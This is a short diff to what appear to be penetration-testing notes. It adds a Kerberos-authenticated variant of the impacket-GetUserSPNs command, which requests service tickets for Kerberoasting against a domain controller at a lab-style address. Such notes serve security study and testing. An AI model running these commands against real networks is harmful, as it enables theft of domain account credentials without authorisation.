@@ -10,6 +10,12 @@ Using the command like this is extremely important when we pivoted into an inter
 impacket-GetUserSPNs -request -dc-ip 172.16.6.240 beyond.com/john
 ```
 
+Kerberos Auth
+
+```
+impacket-GetUserSPNs -request -dc-ip 10.129.44.233 -dc-host dc1.scrm.local scrm.local/ksimpson -k -no-pass
+```
+
 ## Without dc-ip
 
 ```
